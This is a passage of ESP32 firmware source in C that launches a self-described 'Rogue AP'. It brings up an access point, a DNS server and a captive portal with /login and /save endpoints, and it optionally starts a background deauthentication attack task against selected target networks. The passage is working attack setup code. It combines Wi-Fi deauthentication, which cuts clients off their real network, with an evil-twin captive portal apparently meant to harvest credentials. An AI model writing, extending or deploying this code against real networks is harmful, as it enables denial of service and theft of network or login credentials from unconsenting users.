Smethan/projectZero/ESP32C5/main/main.c
    // AP mode already enabled by ensure_ap_mode(), just configure it
    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
        applicationState = IDLE;
        return 1;
    }
    
    // Start DHCP server
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
        applicationState = IDLE;
        return 1;
    }
    
    // Wait a bit for AP to fully start
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    // Configure HTTP server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 7;
    config.uri_match_fn = httpd_uri_match_wildcard;

    // Start HTTP server
    esp_err_t http_ret = httpd_start(&portal_server, &config);
    if (http_ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
        esp_netif_dhcps_stop(ap_netif);
        applicationState = IDLE;
        return 1;
    }
    
    MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
    
    // Register URI handlers (same as start_portal)
    httpd_uri_t root_uri = {
        .uri = "/",
        .method = HTTP_GET,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_uri);
    
    httpd_uri_t root_post_uri = {
        .uri = "/",
        .method = HTTP_POST,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_post_uri);
    
    httpd_uri_t portal_uri = {
        .uri = "/portal",
        .method = HTTP_GET,
        .handler = portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &portal_uri);
    
    httpd_uri_t login_uri = {
        .uri = "/login",
        .method = HTTP_POST,
        .handler = login_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &login_uri);
    
    httpd_uri_t get_uri = {
        .uri = "/get",
        .method = HTTP_GET,
        .handler = get_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &get_uri);
    
    httpd_uri_t save_uri = {
        .uri = "/save",
        .method = HTTP_POST,
        .handler = save_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &save_uri);
    
    httpd_uri_t android_captive_uri = {
        .uri = "/generate_204",
        .method = HTTP_GET,
        .handler = android_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &android_captive_uri);
    
    httpd_uri_t ios_captive_uri = {
        .uri = "/hotspot-detect.html",
        .method = HTTP_GET,
        .handler = ios_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &ios_captive_uri);
    
    httpd_uri_t samsung_captive_uri = {
        .uri = "/ncsi.txt",
        .method = HTTP_GET,
        .handler = captive_detection_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &samsung_captive_uri);
    
    httpd_uri_t captive_uri = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = captive_portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_uri);
    
    httpd_uri_t captive_api_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_GET,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_uri);
    
    httpd_uri_t captive_api_post_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_POST,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_post_uri);
    
    httpd_uri_t captive_api_options_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_OPTIONS,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_options_uri);
    
    // Set portal as active (must be before starting DNS task)
    portal_active = true;
    MY_LOG_INFO(TAG, "Portal marked as active");
    
    // Start DNS server task
    BaseType_t task_ret = xTaskCreate(
        dns_server_task,
        "dns_server",
        4096,
        NULL,
        5,
        &dns_server_task_handle
    );
    
    if (task_ret != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create DNS server task");
        portal_active = false;
        httpd_stop(portal_server);
        portal_server = NULL;
        esp_netif_dhcps_stop(ap_netif);
        applicationState = IDLE;
        return 1;
    }
    
    // If networks are selected, start deauth attack
    if (deauth_enabled) {
        // Save target BSSIDs for channel monitoring
        save_target_bssids();
        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
        
        MY_LOG_INFO(TAG, "Starting deauth attack on %d network(s):", g_selected_count);
        for (int i = 0; i < target_bssid_count; i++) {
            MY_LOG_INFO(TAG, "  [%d] %02X:%02X:%02X:%02X:%02X:%02X (CH %d)",
                        i + 1,
                        target_bssids[i].bssid[0], target_bssids[i].bssid[1],
                        target_bssids[i].bssid[2], target_bssids[i].bssid[3],
                        target_bssids[i].bssid[4], target_bssids[i].bssid[5],
                        target_bssids[i].channel);
        }
        
        // Start deauth attack in background task
        deauth_attack_active = true;
        BaseType_t result = xTaskCreate(
            deauth_attack_task,
            "deauth_task",
            4096,
            NULL,
            5,
            &deauth_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
            deauth_attack_active = false;
            // Portal is still running, so don't fail completely
            MY_LOG_INFO(TAG, "WARNING: Portal running but deauth attack failed to start");
        }
    }
    
    MY_LOG_INFO(TAG, "Rogue AP started successfully!");
    MY_LOG_INFO(TAG, "AP Name: %s (WPA2 protected)", ssid);
    MY_LOG_INFO(TAG, "Password: %s", password);
    MY_LOG_INFO(TAG, "Custom HTML loaded (%zu bytes)", strlen(custom_portal_html));
    MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the captive portal", ssid);
    
    esp_err_t led_err = led_set_color(255, 165, 0); // Orange for rogue AP mode
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for rogue AP mode: %s", esp_err_to_name(led_err));
    }
    
